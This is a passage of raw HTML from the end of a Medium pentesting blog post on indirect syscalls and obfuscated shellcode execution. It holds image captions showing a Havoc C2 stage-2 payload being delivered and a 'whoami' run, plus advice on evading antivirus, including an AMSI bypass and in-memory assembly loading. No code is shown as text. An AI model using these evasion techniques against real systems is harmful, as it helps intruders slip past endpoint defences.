(-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 1000px"><img alt="" class="bi mn pz c" width="1000" height="302" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:1000/1*_mYEyuk-lPhe2oUGRva0xw.png"></picture></div></div><figcaption class="sx fm sy pr ps sz ta bg b bh ab eb" data-selectable-paragraph="">Stage 2 Listener</figcaption></figure></div></div></div><div class="ac ci"><div class="cp bi gq gr gs gt"><p id="c508" class="pw-post-body-paragraph ng nh hl ni b ij nj nk nl im nm nn no np nq nr ns nt nu nv nw nx ny nz oa ob he bl" data-selectable-paragraph="">3. Deliver and Execute the payload as described above</p><figure class="pd pe pf pg ph pu pr ps paragraph-image"><div role="button" tabindex="0" class="pv pw fr px bi py"><span class="fw fx fy ao fz ga gb gc gd speechify-ignore">Press enter or click to view image in full size</span><div class="pr ps td"><picture><source srcset="https://miro.medium.com/v2/resize:fit:640/format:webp/1*DNJpzMlZrBtf8kiTj7d6cw.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*DNJpzMlZrBtf8kiTj7d6cw.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*DNJpzMlZrBtf8kiTj7d6cw.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*DNJpzMlZrBtf8kiTj7d6cw.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*DNJpzMlZrBtf8kiTj7d6cw.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*DNJpzMlZrBtf8kiTj7d6cw.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*DNJpzMlZrBtf8kiTj7d6cw.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"><source data-testid="og" srcset="https://miro.medium.com/v2/resize:fit:640/1*DNJpzMlZrBtf8kiTj7d6cw.png 640w, https://miro.medium.com/v2/resize:fit:720/1*DNJpzMlZrBtf8kiTj7d6cw.png 720w, https://miro.medium.com/v2/resize:fit:750/1*DNJpzMlZrBtf8kiTj7d6cw.png 750w, https://miro.medium.com/v2/resize:fit:786/1*DNJpzMlZrBtf8kiTj7d6cw.png 786w, https://miro.medium.com/v2/resize:fit:828/1*DNJpzMlZrBtf8kiTj7d6cw.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*DNJpzMlZrBtf8kiTj7d6cw.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*DNJpzMlZrBtf8kiTj7d6cw.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"><img alt="" class="bi mn pz c" width="700" height="341" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:700/1*DNJpzMlZrBtf8kiTj7d6cw.png"></picture></div></div><figcaption class="sx fm sy pr ps sz ta bg b bh ab eb" data-selectable-paragraph="">Execute Payload</figcaption></figure></div></div><div class="pu"><div class="ac ci"><div class="mi ri mj rj mk rk cm rl cn rm cp bi"><figure class="pd pe pf pg ph pu ro rp paragraph-image"><div role="button" tabindex="0" class="pv pw fr px bi py"><span class="fw fx fy ao fz ga gb gc gd speechify-ignore">Press enter or click to view image in full size</span><div class="pr ps te"><picture><source srcset="https://miro.medium.com/v2/resize:fit:640/format:webp/1*amXveBebYTr5sswe8E2rzQ.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*amXveBebYTr5sswe8E2rzQ.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*amXveBebYTr5sswe8E2rzQ.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*amXveBebYTr5sswe8E2rzQ.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*amXveBebYTr5sswe8E2rzQ.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*amXveBebYTr5sswe8E2rzQ.png 1100w, https://miro.medium.com/v2/resize:fit:2000/format:webp/1*amXveBebYTr5sswe8E2rzQ.png 2000w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 1000px" type="image/webp"><source data-testid="og" srcset="https://miro.medium.com/v2/resize:fit:640/1*amXveBebYTr5sswe8E2rzQ.png 640w, https://miro.medium.com/v2/resize:fit:720/1*amXveBebYTr5sswe8E2rzQ.png 720w, https://miro.medium.com/v2/resize:fit:750/1*amXveBebYTr5sswe8E2rzQ.png 750w, https://miro.medium.com/v2/resize:fit:786/1*amXveBebYTr5sswe8E2rzQ.png 786w, https://miro.medium.com/v2/resize:fit:828/1*amXveBebYTr5sswe8E2rzQ.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*amXveBebYTr5sswe8E2rzQ.png 1100w, https://miro.medium.com/v2/resize:fit:2000/1*amXveBebYTr5sswe8E2rzQ.png 2000w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 1000px"><img alt="" class="bi mn pz c" width="1000" height="125" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:1000/1*amXveBebYTr5sswe8E2rzQ.png"></picture></div></div><figcaption class="sx fm sy pr ps sz ta bg b bh ab eb" data-selectable-paragraph="">Stage 2 Payload (Havoc C2) Payload Delivered</figcaption></figure><figure class="ma pu ro rp paragraph-image"><div role="button" tabindex="0" class="pv pw fr px bi py"><span class="fw fx fy ao fz ga gb gc gd speechify-ignore">Press enter or click to view image in full size</span><div class="pr ps tf"><picture><source srcset="https://miro.medium.com/v2/resize:fit:640/format:webp/1*v516To3hdZSSCHSfqoBmBw.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*v516To3hdZSSCHSfqoBmBw.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*v516To3hdZSSCHSfqoBmBw.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*v516To3hdZSSCHSfqoBmBw.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*v516To3hdZSSCHSfqoBmBw.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*v516To3hdZSSCHSfqoBmBw.png 1100w, https://miro.medium.com/v2/resize:fit:2000/format:webp/1*v516To3hdZSSCHSfqoBmBw.png 2000w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 1000px" type="image/webp"><source data-testid="og" srcset="https://miro.medium.com/v2/resize:fit:640/1*v516To3hdZSSCHSfqoBmBw.png 640w, https://miro.medium.com/v2/resize:fit:720/1*v516To3hdZSSCHSfqoBmBw.png 720w, https://miro.medium.com/v2/resize:fit:750/1*v516To3hdZSSCHSfqoBmBw.png 750w, https://miro.medium.com/v2/resize:fit:786/1*v516To3hdZSSCHSfqoBmBw.png 786w, https://miro.medium.com/v2/resize:fit:828/1*v516To3hdZSSCHSfqoBmBw.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*v516To3hdZSSCHSfqoBmBw.png 1100w, https://miro.medium.com/v2/resize:fit:2000/1*v516To3hdZSSCHSfqoBmBw.png 2000w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 1000px"><img alt="" class="bi mn pz c" width="1000" height="373" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:1000/1*v516To3hdZSSCHSfqoBmBw.png"></picture></div></div><figcaption class="sx fm sy pr ps sz ta bg b bh ab eb" data-selectable-paragraph="">“whoami” Command Executed on Havoc C2 Listener</figcaption></figure></div></div></div><div class="ac ci"><div class="cp bi gq gr gs gt"><p id="628c" class="pw-post-body-paragraph ng nh hl ni b ij nj nk nl im nm nn no np nq nr ns nt nu nv nw nx ny nz oa ob he bl" data-selectable-paragraph="">Obviously this isnt a perfect exploit, but it taught me some things about indirect syscalls and the power of obfuscation/basic encyption against AV. Don’t rely on this exact PE working in the future especially since I uploaded it to Virus Total, you’ll have to modify it or make your own (possibly a .NET assembly so that you can do reflective assembly loading in PowerShell memory after an AMSI bypass). I hope you enjoyed this post!</p></div></div></div></div></section></div></div></article></div><div class="ac ci"><div class="cp bi gq gr gs gt"><div class="tg th ac ju"><div class="qz ac"><a class="ti ak ao aq" rel="noopener follow" href="https://medium.com/tag/cybersecurity?source=post_page-----bb589148e56f---------------------------------------" data-discover="true"><div class="tj fr de tk gv tl tm bg b bh ab bl gc">Cybersecurity</div></a></div><div class="qz ac"><a class="ti ak ao aq" rel="noopener follow" href="https://medium.com/tag/networking?source=post_page-----bb589148e56f---------------------------------------" data-discover="true"><div class="tj fr de tk gv tl tm bg b bh ab bl gc">Networking</div></a></div><div class="qz ac"><a class="ti ak ao aq" rel="noopener follow" href="https://medium.com/tag/defender-for-endpoint?source=post_page-----bb589148e56f---------------------------------------" data-discover="true"><div class="tj fr de tk gv tl tm bg b bh ab bl gc">Defender For Endpoint</div></a></div><div class="qz ac"><a class="ti ak ao aq" rel="noopener follow" href="https://medium.com/tag/pentesting?source=post_page-----bb589148e56f---------------------------------------" data-discover="true"><div class="tj fr de tk gv tl tm bg b bh ab bl gc">Pentesting</div></a></div></div></div></div><div class="m"></div><div class="uc m"><div class="ac ci"><div class="cp bi gq gr gs gt"><div class="ac jh jf jd ud ue"><div class="uf ug uh ui uj uk ul um un uo ac cw"><div class="i l"><a tabindex="0" rel="noopener follow" href="https://medium.com/@sam.rothlisberger?source=post_page---post_author_info--bb589148e56f---------------------------------------" data-discover="true"><div class="m fr"><img alt="Sam Rothlisberger" class="m fk by up uq de" width="48" height="48" loading="lazy" src="https://miro.medium.com/v2/resize:fill:48:48/1*Fzh2QBHCL67uIEt-y9at1w.jpeg"><div class="gj by m up uq fw o ak ur"></div></div></a></div><div class="k j e"><a tabindex="0" rel="noopener follow" href="https://medium.com/@sam.rothlisberger?source=post_page---post_author_info--bb589148e56f---------------------------------------" data-discover="true"><div class="m fr"><img alt="Sam Rothlisberger" class="m fk by us ut de" width="64" height="64" loading="lazy" src="https://miro.medium.com/v2/resize:fill:64:64/1*Fzh2QBHCL67uIEt-y9at1w.jpeg"><div class="gj by m us ut fw o ak ur"></div></div></a></div><div class="k j e uu cb"><div class="ac"><button class="wa abi aq ac ci r abo lc abp" style="border: 1px solid rgba(4, 4, 4, 0.1);"><span class="bg b bh ab bl bi"><span class="bn abm">Follow</span></span></button></div></div></div><div class="ac cv cd"><div class="uv uw ux rj ri m"><a class="ah ai aj al am an ao ap aq ar as at au av ac r" rel="noopener follow" href="https://medium.com/@sam.rothlisberger?source=post_page---post_author_info--bb589148e56f---------------------------------------" data-discover="true"><h2 class="pw-author-name bg uz va vb vc vd ve vf np si sj nt sl sm nx so sp bl"><span class="he uy">Written by Sam Rothlisberger</span></h2></a><div class="qz ac jj"><div class="m cb"><span class="pw-follower-count bg b bh ab eb"><a class="ah ai aj fo al am an ao ap aq ar as at js" rel="noopener follow" href="https://medium.com/@sam.rothlisberger/followers?source=post_page---post_author_info--bb589148e56f---------------------------------------" data-discover="true">1K followers</a></span></div><div class="bg b bh ab eb ac vg"><span class="vh m" aria-hidden="true"><span class="bg b bh ab eb">·</span></span><a class="ah ai aj fo al am an ao ap aq ar as at js" rel="noopener follow" href="https://medium.com/@sam.rothlisberger/following?source=post_page---post_author_info--bb589148e56f---------------------------------------" data-discover="true">5 following</a></div></div><div class="su m"><p class="bg b bh ab bl">CompTIA Security+ Practice Questions : <a class="ah ai aj fo al am an ao ap aq ar as at rh hf he" href="https://www.udemy.com/course/comptia-security-plus-sy0-701-practice-tests/?referralCode=56015800FAABB6F91CFE" rel="noopener  ugc nofollow">https://www.udemy.com/course/comptia-security-plus-sy0-701-practice-tests/?referralCode=56015800FAABB6F91CFE</a></p></div></div></div><div class="i l"><div class="ac"><button class="wa abi aq ac ci r abo lc abp" style="border: 1px solid rgba(4, 4, 4, 0.1);"><span class="bg b bh ab bl bi"><span class="bn abm">Follow</span></span></button></div></div></div></div></div></div><div class="vi vj vk vl vm m"><div class="vn bi s uc"></div><div class="ac ci"><div class="cp bi gq gr gs gt"><div class="ac r cw"><h2 class="bg uz of il oh oi io ok ol on oo op or os ot ov ow bl">Responses (1)</h2><div class="ac vo"><div><div class="bn" aria-describedby="15" aria-labelledby="15" role="tooltip"><div tabindex="-1" class="bf"><a class="vp vq" href="https://policy.medium.com/medium-rules-30e5502c4eb4?source=post_page---post_responses--bb589148e56f---------------------------------------" rel="noopener follow" target="_blank"><svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" aria-label="Shield with a checkmark" viewBox="0 0 25 25"><path fill-rule="evenodd" d="M11.987 5.036a.754.754 0 0 1 .914-.01c.972.721 1.767 1.218 2.6 1.543.828.322 1.719.485 2.887.505a.755.755 0 0 1 .741.757c-.018 3.623-.43 6.256-1.449 8.21-1.034 1.984-2.662 3.209-4.966 4.083a.75.75 0 0 1-.537-.003c-2.243-.874-3.858-2.095-4.897-4.074-1.024-1.951-1.457-4.583-1.476-8.216a.755.755 0 0 1 .741-.757c1.195-.02 2.1-.182 2.923-.503.827-.322 1.6-.815 2.519-1.535m.468.903c-.897.69-1.717 1.21-2.623 1.564-.898.35-1.856.527-3.026.565.037 3.45.469 5.817 1.36 7.515.884 1.684 2.25 2.762 4.284 3.571 2.092-.81 3.465-1.89 4.344-3.575.886-1.698 1.299-4.065 1.334-7.512-1.149-.039-2.091-.217-2.99-.567-.906-.353-1.745-.873-2.683-1.561m-.009 9.155a2.672 2.672 0 1 0 0-5.344 2.672 2.672 0 0 0 0 5.344m0 1a3.672 3.672 0 1 0 0-7.344 3.672 3.672 0 0 0 0 7.344m-1.813-3.777.525-.526.916.917 1.623-1.625.526.526-2.149 2.152z" clip-rule="evenodd"></path></svg></a></div></div></div></div></div><div class="vr vs vt vu vv vw vx m"><div><div class="bg b bh ab bl"><div class="zq"><div class="zy m"><div class="zz ac r"><div class="m fr"><img alt="" class="m fk by bz ca de" width="32" height="32" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fill:32:32/1*dmbNkD5D-u45r44go_cf0g.png"><div class="gj by m bz ca fw o ak ur"></div></div><div class="bo ac cu cv ci"><p class="bg b bh ab eb">Write a response</p></div></div><div class="de bq ac cv zr zs"><div class="ac cv fr"><span data-dd-action-name="Susi presentation tracker respond_sidebar"><a class="ah ai aj fo al am an ao ap aq ar as at au av" rel="noopener follow" href="https://medium.com/m/signin?operation=register&amp;redirect=https%3A%2F%2Fmedium.com%2F%40sam.rothlisberger%2Fmanual-indirect-syscalls-and-obfuscation-for-shellcode-execution-bb589148e56f&amp;source=---post_responses--bb589148e56f---------------------respond_sidebar------------------" data-discover="true"><div class="xu m"><p class="bg b bh ab eb">What are your thoughts?</p></div></a></span><div class="cw zt eb ac zu yu zv"><span class="bg b bh ab eb"><div class="ac"><div><div class="bn" aria-describedby="28" aria-labelledby="28" role="tooltip"><div tabindex="-1" class="bf"><span role="button" aria-label="Bold (⌘B)" class="aba abb abc abd bq mh ci abe abf abg" tabindex="0"><svg width="21" height="21"><path fill-rule="evenodd" d="M10.308 17.993h-5.92l.11-.894.783-.12c.56-.11.79-.224.79-.448V5.37c0-.225-.113-.336-.902-.448H4.5l-.114-.894h6.255c4.02 0 5.58 1.23 5.58 3.13 0 1.896-1.78 3.125-3.79 3.463v.11c2.69.34 4.25 1.56 4.25 3.57 0 2.35-2.01 3.69-6.37 3.69l.02.01h-.02zm-.335-12.96H8.967V10.5h1.23c1.788 0 2.79-1.23 2.79-2.683 0-1.685-1.004-2.803-3.006-2.803v.02zm-.223 6.36h-.783v5.588l1.225.23h.22c1.67 0 3.01-1.004 3.01-2.792 0-2.122-1.566-3.016-3.69-3.016h.018z"></path></svg></span></div></div></div><div><div class="bn" aria-describedby="29" aria-labelledby="29" role="tooltip"><div tabindex="-1" class="bf"><span role="button" aria-label="Italic (⌘I)" class="aba abb abc abd bq mh ci abe abf abg" tabindex="0"><svg width="21" height="21"><path fill-rule="evenodd" d="M9.847 18.04c-.533 0-2.027-.64-1.92-.853l2.027-7.68-.64-.214-1.387 1.494-.427-.427c.534-1.173 1.707-2.667 2.774-2.667.533 0 2.24.534 2.133.854l-2.133 7.786.533.214 1.6-1.067.427.427c-.64 1.066-1.92 2.133-2.987 2.133m2.347-11.733c-.96 0-1.387-.64-1.387-1.387 0-1.067.747-1.92 1.493-1.92.854 0 1.387.64 1.387 1.493-.107 1.067-.747 1.814-1.493 1.814"></path></svg></span></div></div></div></div></span><div class="zw uu ac zu yu zv"><div class="zx"><button class="bg b ec ab bl abh vz wa wb mg md wc fc fd fe wd we wf fh fi fj fk bn fl fm" data-testid="CancelResponseButton">Cancel</button></div><button class="bg b ec ab yh abh yi yj yk yl wc fc fd ym yn yo fh fi fj fk bn fl fm" disabled="" data-testid="ResponseRespondButton">Respond</button></div></div></div></div></div></div></div></div></div><div class="vs m"><div class="bi ed"><div class="ahd ahe m"><div class="ac cw"><div class="ac r"><div><div class="bn" aria-describedby="203" aria-labelledby="203" role="tooltip"><div tabindex="-1" class="bf"><a class="ah ai aj fo al am an ao ap aq ar as at au av" rel="noopener follow" href="https://medium.com/@kankojoseph?source=post_page---post_responses--bb589148e56f----0-----------------------------------" data-discover="true"><div class="m fr"><div class="m fr"><img alt="Joseph &quot;n3m0” KANKO" class="m fk by bz ca de" width="32" height="32" loading="lazy" src="https://miro.medium.com/v2/resize:fill:32:32/1*m1fYMNmaiHN9OwQuHaDzlw.png"><div class="gj by m bz ca fw o ak gk"></div></div></div></a></div></div></div><div class="ahf m"><div class="ac r"><div><div class="bn" aria-describedby="204" aria-labelledby="204" role="tooltip"><div tabindex="-1" class="bf"><a class="ah ai aj fo al am an ao ap aq ar as at au av ac r agm ahg" rel="noopener follow" href="https://medium.com/@kankojoseph?source=post_page---post_responses--bb589148e56f----0-----------------------------------" data-discover="true"><div class="ac jj agm"><p class="bg b bh ab ga aen ql qm aeo qo aep qp bl">Joseph "n3m0” KANKO</p></div></a></div></div></div></div><a class="ah ai aj fo al am an ao ap aq ar as at au av" rel="noopener follow" href="https://medium.com/@kankojoseph/thx-78f255299e61?source=post_page---post_responses--bb589148e56f----0-----------------------------------" data-discover="true"><p class="bg b ec ab eb"><span>Aug 20, 2025</span></p></a></div></div><div class="bn"><button class="ah fs aj fo al am an mo ap aq ar fe mp mq me mr"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M4.385 12c0 .55.2 1.02.59 1.41.39.4.86.59 1.41.59s1.02-.2 1.41-.59c.4-.39.59-.86.59-1.41s-.2-1.02-.59-1.41a1.93 1.93 0 0 0-1.41-.59c-.55 0-1.02.2-1.41.59-.4.39-.59.86-.59 1.41m5.62 0c0 .55.2 1.02.58 1.41.4.4.87.59 1.42.59s1.02-.2 1.41-.59c.4-.39.59-.86.59-1.41s-.2-1.02-.59-1.41a1.93 1.93 0 0 0-1.41-.59c-.55 0-1.03.2-1.42.59s-.58.86-.58 1.41m5.6 0c0 .55.2 1.02.58 1.41.4.4.87.59 1.43.59s1.03-.2 1.42-.59.58-.86.58-1.41-.2-1.02-.58-1.41a1.93 1.93 0 0 0-1.42-.59c-.56 0-1.04.2-1.43.59s-.58.86-.58 1.41" clip-rule="evenodd"></path></svg></button></div></div><div class="ahh m he"><pre class="vg"><div class="ahi m"><div class="bg b bh ab bl"><div class="zq">thx</div></div></div></pre></div><div class="ahj ac r ld cw"><div class="ac r ae"><div class="ac r ld le"><div class="pw-multi-vote-icon fr lf lg lh li"><span data-dd-action-name="Susi presentation tracker respond_sidebar"><a class="ah ai aj fo al am an ao ap aq ar as at au av" rel="noopener follow" href="https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fvote%2Fp%2F78f255299e61&amp;operation=register&amp;redirect=https%3A%2F%2Fmedium.com%2F%40kankojoseph%2Fthx-78f255299e61&amp;user=Joseph+%22n3m0%E2%80%9D+KANKO&amp;userId=8d9787449bf9&amp;source=---post_responses--78f255299e61----0-----------------respond_sidebar------------------" data-discover="true"><div class="lj aq lk ll lm ln ao lo lp lq li" role="presentation"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" aria-label="clap"><path fill-rule="evenodd" d="M11.37.828 12 3.282l.63-2.454zM13.916 3.953l1.523-2.112-1.184-.39zM8.589 1.84l1.522 2.112-.337-2.501zM18.523 18.92c-.86.86-1.75 1.246-2.62 1.33a6 6 0 0 0 .407-.372c2.388-2.389 2.86-4.951 1.399-7.623l-.912-1.603-.79-1.672c-.26-.56-.194-.98.203-1.288a.7.7 0 0 1 .546-.132c.283.046.546.231.728.5l2.363 4.157c.976 1.624 1.141 4.237-1.324 6.702m-10.999-.438L3.37 14.328a.828.828 0 0 1 .585-1.408.83.83 0 0 1 .585.242l2.158 2.157a.365.365 0 0 0 .516-.516l-2.157-2.158-1.449-1.449a.826.826 0 0 1 1.167-1.17l3.438 3.44a.363.363 0 0 0 .516 0 .364.364 0 0 0 0-.516L5.293 9.513l-.97-.97a.826.826 0 0 1 0-1.166.84.84 0 0 1 1.167 0l.97.968 3.437 3.436a.36.36 0 0 0 .517 0 .366.366 0 0 0 0-.516L6.977 7.83a.82.82 0 0 1-.241-.584.82.82 0 0 1 .824-.826c.219 0 .43.087.584.242l5.787 5.787a.366.366 0 0 0 .587-.415l-1.117-2.363c-.26-.56-.194-.98.204-1.289a.7.7 0 0 1 .546-.132c.283.046.545.232.727.501l2.193 3.86c1.302 2.38.883 4.59-1.277 6.75-1.156 1.156-2.602 1.627-4.19 1.367-1.418-.236-2.866-1.033-4.079-2.246M10.75 5.971l2.12 2.12c-.41.502-.465 1.17-.128 1.89l.22.465-3.523-3.523a.8.8 0 0 1-.097-.368c0-.22.086-.428.241-.584a.847.847 0 0 1 1.167 0m7.355 1.705c-.31-.461-.746-.758-1.23-.837a1.44 1.44 0 0 0-1.11.275c-.312.24-.505.543-.59.881a1.74 1.74 0 0 0-.906-.465 1.47 1.47 0 0 0-.82.106l-2.182-2.182a1.56 1.56 0 0 0-2.2 0 1.54 1.54 0 0 0-.396.701 1.56 1.56 0 0 0-2.21-.01 1.55 1.55 0 0 0-.416.753c-.624-.624-1.649-.624-2.237-.037a1.557 1.557 0 0 0 0 2.2c-.239.1-.501.238-.715.453a1.56 1.56 0 0 0 0 2.2l.516.515a1.556 1.556 0 0 0-.753 2.615L7.01 19c1.32 1.319 2.909 2.189 4.475 2.449q.482.08.971.08c.85 0 1.653-.198 2.393-.579.231.033.46.054.686.054 1.266 0 2.457-.52 3.505-1.567 2.763-2.763 2.552-5.734 1.439-7.586z" clip-rule="evenodd"></path></svg></div></a></span></div><div class="pw-multi-vote-count m lr ls lt lu lv lw lx"><p class="bg b ec ab eb"><span class="ly">--</span></p></div></div><p class="bg b ec ab bl"><button class="ah ai aj fo al am an ao ap aq ar as at rh">Reply</button></p></div></div></div></div></div></div></div></div><div class="wl wm wn wo wp m bx"><div class="ac ci"><div class="cp bi gq gr gs gt"><div class="abq abr dt du dv su m"><h2 class="bg uz of il oh oi io ok ol on oo op or os ot ov ow bl">More from Sam Rothlisberger</h2></div><div class="abs ac ld ju abt abu abv abw abx aby abz aca acb acc acd ace acf acg ach"><div class="aci acj ack ri acl acm acn rj aco acp acq acr acs act acu acv acw acx acy acz ada"><div class="adb adc add ade adf ed m"><article class="ed" data-testid="post-preview"><div class="ed tr m"><div class="bi ed"><div class="ed m"></div></div></div></article></div></div><div class="aci acj ack ri acl acm acn rj aco acp acq acr acs act acu acv acw acx acy acz ada"><div class="adb adc add ade adf ed m"><article class="ed" data-testid="post-preview"><div class="ed tr m"><div class="bi ed"><div class="ed m"></div></div></div></article></div></div><div class="aci acj ack ri acl acm acn rj aco acp acq acr acs act acu acv acw acx acy acz ada"><div class="adb adc add ade adf ed m"><article class="ed" data-testid="post-preview"><div class="ed tr m"><div class="bi ed"><div class="ed m"></div></div></div></article></div></div><div class="aci acj ack ri acl acm acn rj aco acp acq acr acs act acu acv acw acx acy acz ada"><div class="adb adc add ade adf ed m"><article class="ed" data-testid="post-preview"><div class="ed tr m"><div class="bi ed"><div class="ed m"></div></div></div></article></div></div></div><div class="vn bi wq dr ds agq agr ags"></div><div class="ac ue ud jd jf jh"><a class="bg b bh ab bl tj vz wa wb mg md wc fc fd fe wd we wf fh wg wh wi wj wk fi fj fk bn fl fm" rel="noopener follow" href="https://medium.com/@sam.rothlisberger?source=post_page---author_recirc--bb589148e56f---------------------------------------" data-discover="true"><div class="m fm">See all from Sam Rothlisberger</div></a></div></div></div><div class="vn bi wq agt agu agv agw agx"></div><div class="ac ci"><div class="cp bi gq gr gs gt"><div class="agy agz m"><h2 class="bg uz of il oh oi io ok ol on oo op or os ot ov ow bl">Recommended from Medium</h2><div class="pd pe pf pg ph m"><div class="abs ac ld ju abt abu abv abw abx aby abz aca acb acc acd ace acf acg ach"><div class="aci acj ack ri acl acm acn rj aco acp acq acr acs act acu acv acw acx acy acz ada"><div class="adb adc add ade adf ed m"><article class="ed" data-testid="post-preview"><div class="ed tr m"><div class="bi ed"><div class="ed m"></div></div></div></article></div></div><div class="aci acj ack ri acl acm acn rj aco acp acq acr acs act acu acv acw acx acy acz ada"><div class="adb adc add ade adf ed m"><article class="ed" data-testid="post-preview"><div class="ed tr m"><div class="bi ed"><div class="ed m"></div></div></div></article></div></div></div></div><div class="abs ac ld ju abt abu abv abw abx aby abz aca acb acc acd ace acf acg ach"><div class="aci acj ack ri acl acm acn rj aco acp acq acr acs act acu acv acw acx acy acz ada"><div class="adb adc add ade adf ed m"><article class="ed" data-testid="post-preview"><div class="ed tr m"><div class="bi ed"><div class="ed m"></div></div></div></article></div></div><div class="aci acj ack ri acl acm acn rj aco acp acq acr acs act acu acv acw acx acy acz ada"><div class="adb adc add ade adf ed m"><article class="ed" data-testid="post-preview"><div class="ed tr m"><div class="bi ed"><div class="ed m"></div></div></div></article></div></div><div class="aci acj ack ri acl acm acn rj aco acp acq acr acs act acu acv acw acx acy acz ada"><div class="adb adc add ade adf ed m"><article class="ed" data-testid="post-preview"><div class="ed tr m"><div class="bi ed"><div class="ed m"></div></div></div></article></div></div><div class="aci acj ack ri acl acm acn rj aco acp acq acr acs act acu acv acw acx acy acz ada"><div class="adb adc add ade adf ed m"><article class="ed" data-testid="post-preview"><div class="ed tr m"><div class="bi ed"><div class="ed m"></div></div></div></article></div></div></div><div class="vn bi wq dr ds agq agr ags"></div><a class="bg b bh ab bl tj vz wa wb mg md wc fc fd fe wd we wf fh wg wh wi wj wk fi fj fk bn fl fm" rel="noopener follow" href="https://medium.com/?source=post_page---read_next_recirc--bb589148e56f---------------------------------------" data-discover="true"><div class="m fm">See more recommendations</div></a></div></div></div><div class="i l k"><div class="vn bi wq wr"></div><div class="ac ci"><div class="cp bi gq gr gs gt"><div 